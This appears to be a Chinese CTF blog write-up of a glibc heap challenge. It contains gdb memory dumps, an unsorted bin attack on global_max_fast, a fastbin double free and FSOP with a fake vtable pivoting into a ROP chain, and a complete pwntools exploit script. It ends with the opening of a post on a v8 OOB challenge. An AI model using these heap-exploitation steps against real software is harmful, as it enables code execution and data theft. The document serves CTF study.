<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x559b8d502230:	0x00007f0472a04260	0x0000000000000091  &lt;- 0</span><br><span class="line">0x559b8d502240:	0x0000000000636261	0x0000000000000000</span><br><span class="line">0x559b8d502250:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d502260:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d502270:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d502280:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d502290:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d5022a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d5022b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d5022c0:	0x0000000000000000	0x0000000000000091  &lt;- 1</span><br><span class="line">0x559b8d5022d0:	0x0000000000636261	0x0000000000000000</span><br><span class="line">0x559b8d5022e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d5022f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d502300:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d502310:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d502320:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d502330:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d502340:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d502350:	0x0000000000000000	0x0000000000000091  &lt;- 2</span><br><span class="line">0x559b8d502360:	0x0000000000636261	0x0000000000000000</span><br><span class="line">0x559b8d502370:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d502380:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d502390:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d5023a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d5023b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d5023c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559b8d5023d0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>先<code>free(2)</code>，再<code>free(0)</code>，然后再<code>show(0)</code>，就可以leak出heap的地址</p>
<p>然后再<code>free(1)</code>，此时就会触发<code>malloc_consolidate</code>，使这三个块合并成一个大块，size为0x1b0</p>
<p>此时<code>show(0)</code>就可以得到libc的地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x55bda3f43230:	0x00007f0a92415260	0x00000000000001b1  &lt;- 0</span><br><span class="line">0x55bda3f43240:	0x00007f0a92416b78	0x00007f0a92416b78</span><br><span class="line">0x55bda3f43250:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f43260:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f43270:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f43280:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f43290:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f432a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f432b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f432c0:	0x0000000000000090	0x0000000000000090  &lt;- 1</span><br><span class="line">0x55bda3f432d0:	0x0000000000636261	0x0000000000000000</span><br><span class="line">0x55bda3f432e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f432f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f43300:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f43310:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f43320:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f43330:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f43340:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f43350:	0x0000000000000000	0x0000000000000091  &lt;- 2</span><br><span class="line">0x55bda3f43360:	0x00007f0a92416b78	0x00007f0a92416b78</span><br><span class="line">0x55bda3f43370:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f43380:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f43390:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f433a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f433b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f433c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55bda3f433d0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>此时构造</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x80</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) \</span><br><span class="line">    + <span class="string">'a'</span> * <span class="number">0x80</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) \</span><br><span class="line">    + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br></pre></td></tr></table></figure>

<p>然后再<code>add(4, 0x1a0, payload)</code>，就可以得到前面那个合并的块，并把块的内容填充为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x55e319de3230:	0x00007f99fd61e260	0x00000000000001b1  &lt;- 0 4</span><br><span class="line">0x55e319de3240:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55e319de3250:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55e319de3260:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55e319de3270:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55e319de3280:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55e319de3290:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55e319de32a0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55e319de32b0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55e319de32c0:	0x0000000000000000	0x0000000000000091  &lt;- 1</span><br><span class="line">0x55e319de32d0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55e319de32e0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55e319de32f0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55e319de3300:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55e319de3310:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55e319de3320:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55e319de3330:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55e319de3340:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55e319de3350:	0x0000000000000000	0x0000000000000021  &lt;- 2</span><br><span class="line">0x55e319de3360:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55e319de3370:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55e319de3380:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55e319de3390:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55e319de33a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55e319de33b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55e319de33c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55e319de33d0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p><code>payload</code>将块1的size的<code>prev_inuse</code>置1，并将其下的块的size变为0x21，以及在块2中又构造了个size为0x21的小块</p>
<p>这样做的目的是为了绕过<code>malloc_consolidate</code>的检测，即检测块1的下一块的下一块的<code>prev_inuse</code>来确认块1的下一块是否被使用，如果是，则不管，如果否，则合并，合并的时候就会触发其他操作导致出错</p>
<p><code>free(4)</code>，再<code>free(1)</code>，此时块1就位于unsortedin中了</p>
<p>接下来</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">5</span>, <span class="number">0x1a0</span>, <span class="string">'a'</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(leak)+p64(leak + <span class="number">0x1c70</span>))</span><br></pre></td></tr></table></figure>

<p>leak是leak出来的libc的地址，为<code>main_arena+88</code></p>
<p>这样又把大块分配了出来，此时内存格局为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x55b1bc2d3230:	0x00007fef77c65260	0x00000000000001b1  &lt;- 0 4 5</span><br><span class="line">0x55b1bc2d3240:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55b1bc2d3250:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55b1bc2d3260:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55b1bc2d3270:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55b1bc2d3280:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55b1bc2d3290:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55b1bc2d32a0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55b1bc2d32b0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55b1bc2d32c0:	0x0000000000000000	0x0000000000000091  &lt;- 1</span><br><span class="line">0x55b1bc2d32d0:	0x00007fef77c66b78	0x00007fef77c687e8  &lt;- &amp;global_max_fast-0x10</span><br><span class="line">0x55b1bc2d32e0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55b1bc2d32f0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55b1bc2d3300:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55b1bc2d3310:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55b1bc2d3320:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55b1bc2d3330:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55b1bc2d3340:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55b1bc2d3350:	0x0000000000000090	0x0000000000000020  &lt;- 2</span><br><span class="line">0x55b1bc2d3360:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b1bc2d3370:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55b1bc2d3380:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b1bc2d3390:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b1bc2d33a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b1bc2d33b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b1bc2d33c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55b1bc2d33d0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>块1的bk就被改成了<code>&amp;global_max_fast-0x10</code>，同时，<code>unsorted bin</code>指向的也是块1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; unsortedbin </span><br><span class="line">unsortedbin</span><br><span class="line">all [corrupted]</span><br><span class="line">FD: 0x55b1bc2d32c0 —▸ 0x7fef77c66b78 (main_arena+88) ◂— 0x55b1bc2d32c0</span><br><span class="line">BK: 0x55b1bc2d32c0 —▸ 0x7fef77c687e8 (free_list) ◂— 0x0</span><br></pre></td></tr></table></figure>

<p>这时再<code>add(6, 0x80, &#39;abc&#39;)</code>就会触发<code>unsorted bin attack</code>，将<code>global_max_fast</code>修改</p>
<p>到此，攻击<code>global_max_fast</code>就完成了</p>
<h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><p>做题的时候官方给出过提示，vtable fake</p>
<p>还记得最开始添加的块7和块8么，现在就派上用场了，用他们来<code>double free</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line">dele(<span class="number">7</span>)</span><br></pre></td></tr></table></figure>

<p>为了控制程序流程，我们要控制<code>_IO_list_all</code>，结果就发现<code>_IO_list_all</code>所指就在堆上，堆的基址处，然后又在<code>heap_base + 0x13</code>的地方发现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/gx 0x55b1bc2d3000+0x13</span><br><span class="line">0x55b1bc2d3013:	0x2d309300000000fb</span><br></pre></td></tr></table></figure>

<p>因为检查size的时候只取最后四个字节，所以这里完全可以作为一个size为0xf0的块的size</p>
<p>所以，<code>heap_addr = heap_base + 0x13 - 0x8</code></p>
<p>将块用<code>double free</code>分配到<code>heap_addr</code></p>
<p><code>double free</code>的同时会产生两个块，由于题目所给空间比较小，因此要将这两个块一并用上</p>
<p>我的思路是，覆盖<code>_IO_FILE_</code>的<code>_chain</code>为堆地址，然后在产生的两个块上分别构造<code>fake_io_struct</code>以及<code>ropchain</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">heap_b = heap_base + <span class="number">0x470</span> + <span class="number">0x10</span></span><br><span class="line">heap_a = heap_base + <span class="number">0x560</span> + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>, <span class="number">0xe0</span>, p64(heap_addr))</span><br><span class="line"></span><br><span class="line">pop_rdi = libc.address + <span class="number">0x0000000000021102</span></span><br><span class="line">pop_rsi = libc.address + <span class="number">0x00000000000202e8</span></span><br><span class="line">pop_rdx = libc.address + <span class="number">0x0000000000001b92</span></span><br><span class="line"></span><br><span class="line">fake_io_struct = p64(<span class="number">0xfbda2008</span>) \</span><br><span class="line">    + p64(<span class="number">0</span>) * <span class="number">4</span> \</span><br><span class="line">    + p64(<span class="number">1</span>) \</span><br><span class="line">    + p64(<span class="number">0</span>) * <span class="number">3</span> \</span><br><span class="line">    + p64(<span class="number">0</span>) * <span class="number">4</span> + p64(heap_b) \    </span><br><span class="line">    + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0</span>) \</span><br><span class="line">    + p64(<span class="number">0xffffffffffffffff</span>) + p64(<span class="number">0</span>) + p64(heap_b+<span class="number">0x48</span>)  \</span><br><span class="line">    + p64(libc.sym[<span class="string">'open'</span>]) + p64(<span class="number">0</span>) * <span class="number">5</span> + p64(heap_base+<span class="number">0x80</span><span class="number">-0x18</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xa</span>, <span class="number">0xe0</span>, fake_io_struct)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ropchain = <span class="string">'flag\x00\x00\x00\x00'</span> + p64(heap_b) + p64(<span class="number">0</span>)</span><br><span class="line">ropchain = ropchain.ljust(<span class="number">0xa0</span><span class="number">-0x60</span>, <span class="string">'\x00'</span>)</span><br><span class="line">ropchain += p64(<span class="number">0</span>)</span><br><span class="line">ropchain += p64(pop_rdi) + p64(<span class="number">4</span>)</span><br><span class="line">ropchain += p64(pop_rsi) + p64(heap_base + <span class="number">0x240</span>)</span><br><span class="line">ropchain += p64(pop_rdx) + p64(<span class="number">0x100</span>) + p64(libc.sym[<span class="string">'read'</span>])</span><br><span class="line">ropchain += p64(pop_rdi) + p64(<span class="number">1</span>)</span><br><span class="line">ropchain += p64(pop_rsi) + p64(heap_base + <span class="number">0x240</span>)</span><br><span class="line">ropchain += p64(pop_rdx) + p64(<span class="number">0x100</span>) + p64(libc.sym[<span class="string">'write'</span>])</span><br><span class="line">add(<span class="number">0xb</span>, <span class="number">0xe0</span>, ropchain)</span><br></pre></td></tr></table></figure>

<p>其中有许多偏移处的各种地址，这是为了迎合一个gadget</p>
<p>覆盖<code>_IO_FILE</code>的<code>_chain</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">fake_vtable = p64(libc.sym[<span class="string">'setcontext'</span>]+<span class="number">53</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(heap_base+<span class="number">0x93</span>)[<span class="number">3</span>:] \</span><br><span class="line">    + p64(heap_base+<span class="number">0x93</span>) * <span class="number">6</span> \</span><br><span class="line">    + p64(heap_base+<span class="number">0x93</span>+<span class="number">1</span>) + p64(<span class="number">0</span>) * <span class="number">4</span> + p64(heap_a)</span><br><span class="line">    <span class="comment">#+ p64(3) + p64(0) * 2 + p64(heap_base+0xf0) \</span></span><br><span class="line">    <span class="comment">#+ p64(0xffffffffffffffff) + p64(0) + p64(heap_base+0x100)  \</span></span><br><span class="line">    <span class="comment">#+ p64(0) * 6 + 'aaaaaaaa'</span></span><br><span class="line">add(<span class="number">0xd</span>, <span class="number">0xe0</span>, payload + fake_vtable)</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="comment">// libc.sym['setcontext']+53</span></span><br><span class="line">&lt;setcontext+<span class="number">53</span>&gt;:   mov    rsp,QWORD PTR [rdi+<span class="number">0xa0</span>]</span><br><span class="line">&lt;setcontext+<span class="number">60</span>&gt;:   mov    rbx,QWORD PTR [rdi+<span class="number">0x80</span>]</span><br><span class="line">&lt;setcontext+<span class="number">67</span>&gt;:   mov    rbp,QWORD PTR [rdi+<span class="number">0x78</span>]</span><br><span class="line">&lt;setcontext+<span class="number">71</span>&gt;:   mov    r12,QWORD PTR [rdi+<span class="number">0x48</span>]</span><br><span class="line">&lt;setcontext+<span class="number">75</span>&gt;:   mov    r13,QWORD PTR [rdi+<span class="number">0x50</span>]</span><br><span class="line">&lt;setcontext+<span class="number">79</span>&gt;:   mov    r14,QWORD PTR [rdi+<span class="number">0x58</span>]</span><br><span class="line">&lt;setcontext+<span class="number">83</span>&gt;:   mov    r15,QWORD PTR [rdi+<span class="number">0x60</span>]</span><br><span class="line">&lt;setcontext+<span class="number">87</span>&gt;:   mov    rcx,QWORD PTR [rdi+<span class="number">0xa8</span>]</span><br><span class="line">&lt;setcontext+<span class="number">94</span>&gt;:   push   rcx</span><br><span class="line">&lt;setcontext+<span class="number">95</span>&gt;:   mov    rsi,QWORD PTR [rdi+<span class="number">0x70</span>]</span><br><span class="line">&lt;setcontext+<span class="number">99</span>&gt;:   mov    rdx,QWORD PTR [rdi+<span class="number">0x88</span>]</span><br><span class="line">&lt;setcontext+<span class="number">106</span>&gt;:  mov    rcx,QWORD PTR [rdi+<span class="number">0x98</span>]</span><br><span class="line">&lt;setcontext+<span class="number">113</span>&gt;:  mov    r8,QWORD PTR [rdi+<span class="number">0x28</span>]</span><br><span class="line">&lt;setcontext+<span class="number">117</span>&gt;:  mov    r9,QWORD PTR [rdi+<span class="number">0x30</span>]</span><br><span class="line">&lt;setcontext+<span class="number">121</span>&gt;:  mov    rdi,QWORD PTR [rdi+<span class="number">0x68</span>]</span><br><span class="line">&lt;setcontext+<span class="number">125</span>&gt;:  xor    eax,eax</span><br><span class="line">&lt;setcontext+<span class="number">127</span>&gt;:  ret</span><br></pre></td></tr></table></figure>

<p>由于执行vtable中的函数的时候，会把<code>_IO_FILE</code>结构体指针当作第一个参数，所以将<code>fake_io_struct</code>构造好之后，就可以让栈迁移到堆上，然后执行我们的ROP链最后读出flag</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">rn = <span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x:io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">r = <span class="keyword">lambda</span> :io.recv()</span><br><span class="line">it = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">success = <span class="keyword">lambda</span> x, y:log.success(x + <span class="string">' '</span>+ hex(y))</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./pwn'</span></span><br><span class="line"></span><br><span class="line">io = process(binary)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size, cont)</span>:</span></span><br><span class="line">    ru(<span class="string">'Choice:'</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'input your index:\n'</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'input your size:\n'</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(<span class="string">'input your context:'</span>)</span><br><span class="line">    sl(cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">    ru(<span class="string">'Choice:'</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">'input your index:\n'</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    ru(<span class="string">'Choice:'</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">'input your index:\n'</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx)</span>:</span></span><br><span class="line">    ru(<span class="string">'Choice:'</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">'input your index:\n'</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    add(i, <span class="number">0x80</span>, <span class="string">'abc'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>, <span class="number">0xe0</span>, <span class="string">'abc'</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0xe0</span>, <span class="string">'abc'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">': '</span>)</span><br><span class="line">heap_base = u64(ru(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) &amp; ~<span class="number">0xfff</span></span><br><span class="line">success(<span class="string">'heap base:'</span>, heap_base)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">': '</span>)</span><br><span class="line">leak = u64(ru(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">success(<span class="string">'leak:'</span>, leak)</span><br><span class="line">libc.address = leak - <span class="number">0x3c4b78</span></span><br><span class="line">success(<span class="string">'libc base'</span>, libc.address)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x80</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) \</span><br><span class="line">    + <span class="string">'a'</span> * <span class="number">0x80</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) \</span><br><span class="line">    + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x1a0</span>, payload)</span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x1a0</span>, <span class="string">'a'</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(leak)+p64(leak + <span class="number">0x1c70</span>))</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x80</span>, <span class="string">'abc'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">heap_addr = heap_base + <span class="number">0x13</span> - <span class="number">0x8</span></span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">heap_b = heap_base + <span class="number">0x470</span> + <span class="number">0x10</span></span><br><span class="line">heap_a = heap_base + <span class="number">0x560</span> + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>, <span class="number">0xe0</span>, p64(heap_addr))</span><br><span class="line"></span><br><span class="line">pop_rdi = libc.address + <span class="number">0x0000000000021102</span></span><br><span class="line">pop_rsi = libc.address + <span class="number">0x00000000000202e8</span></span><br><span class="line">pop_rdx = libc.address + <span class="number">0x0000000000001b92</span></span><br><span class="line"></span><br><span class="line">fake_vtable = p64(libc.sym[<span class="string">'setcontext'</span>]+<span class="number">53</span>)</span><br><span class="line">fake_io_struct = p64(<span class="number">0xfbda2008</span>) \</span><br><span class="line">    + p64(<span class="number">0</span>) * <span class="number">4</span> \</span><br><span class="line">    + p64(<span class="number">1</span>) \</span><br><span class="line">    + p64(<span class="number">0</span>) * <span class="number">3</span> \</span><br><span class="line">    + p64(<span class="number">0</span>) * <span class="number">4</span> + p64(heap_b) \</span><br><span class="line">    + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0</span>) \</span><br><span class="line">    + p64(<span class="number">0xffffffffffffffff</span>) + p64(<span class="number">0</span>) + p64(heap_b+<span class="number">0x48</span>)  \</span><br><span class="line">    + p64(libc.sym[<span class="string">'open'</span>]) + p64(<span class="number">0</span>) * <span class="number">5</span> + p64(heap_base+<span class="number">0x80</span><span class="number">-0x18</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xa</span>, <span class="number">0xe0</span>, fake_io_struct)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ropchain = <span class="string">'flag\x00\x00\x00\x00'</span> + p64(heap_b) + p64(<span class="number">0</span>)</span><br><span class="line">ropchain = ropchain.ljust(<span class="number">0xa0</span><span class="number">-0x60</span>, <span class="string">'\x00'</span>)</span><br><span class="line">ropchain += p64(<span class="number">0</span>)</span><br><span class="line">ropchain += p64(pop_rdi) + p64(<span class="number">4</span>)</span><br><span class="line">ropchain += p64(pop_rsi) + p64(heap_base + <span class="number">0x240</span>)</span><br><span class="line">ropchain += p64(pop_rdx) + p64(<span class="number">0x100</span>) + p64(libc.sym[<span class="string">'read'</span>])</span><br><span class="line">ropchain += p64(pop_rdi) + p64(<span class="number">1</span>)</span><br><span class="line">ropchain += p64(pop_rsi) + p64(heap_base + <span class="number">0x240</span>)</span><br><span class="line">ropchain += p64(pop_rdx) + p64(<span class="number">0x100</span>) + p64(libc.sym[<span class="string">'write'</span>])</span><br><span class="line">add(<span class="number">0xb</span>, <span class="number">0xe0</span>, ropchain)</span><br><span class="line"></span><br><span class="line">payload = p64(heap_base+<span class="number">0x93</span>)[<span class="number">3</span>:] \</span><br><span class="line">    + p64(heap_base+<span class="number">0x93</span>) * <span class="number">6</span> \</span><br><span class="line">    + p64(heap_base+<span class="number">0x93</span>+<span class="number">1</span>) + p64(<span class="number">0</span>) * <span class="number">4</span> + p64(heap_a)</span><br><span class="line">    <span class="comment">#+ p64(3) + p64(0) * 2 + p64(heap_base+0xf0) \</span></span><br><span class="line">    <span class="comment">#+ p64(0xffffffffffffffff) + p64(0) + p64(heap_base+0x100)  \</span></span><br><span class="line">    <span class="comment">#+ p64(0) * 6 + 'aaaaaaaa'</span></span><br><span class="line">add(<span class="number">0xd</span>, <span class="number">0xe0</span>, payload + fake_vtable)</span><br><span class="line">sl(<span class="string">'5'</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这道题挺好的，学到了新姿势，同时又更加佩服那些当场做出题的师傅们</p>
<p>这里主要是偏移不好算，而且还有更加简单一点的办法，就是直接覆盖<code>_IO_list_all</code>指向的那个<code>_IO_FILE</code>即第一个块的vtable，然后就有更多的空间来布置vtable和ropchain了，不像我似的，东拼西凑出来的空间</p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>starCTF oob复现</title>
    <url>/2019/10/18/starCTF-oob%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>自从数字经济2019线下赛之后，体验了一把小白难度的Real World，虽然一道题没出来，但是至少给学习带来了前进的方向</p>
<p>遂想要复现当时赛场的一道chrome的题目，于是着手开始学习v8的利用</p>
<p>starCTF 的 oob很简单，是个不错的选择</p>
<p>题目链接：<a href="https://github.com/DayJun/Blogs/tree/master/Articles/starCTF-OOB" target="_blank" rel="noopener">Github</a></p>
<a id="more"></a>

<p>参考：<a href="https://www.freebuf.com/vuls/203721.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/203721.html</a></p>
<p>建议先把大佬的文章看完，然后本文权当补充以及自我总结</p>
<h1 id="下载编译v8"><a href="#下载编译v8" class="headerlink" title="下载编译v8"></a>下载编译v8</h1><p>因为墙的缘故，下载v8会很烦人。在我感叹利用朋友搭的VPS也不能在国内愉快地下载v8的源码的时候，不得已买了个vpn，我才发现，原来下载慢只是钱不到位</p>
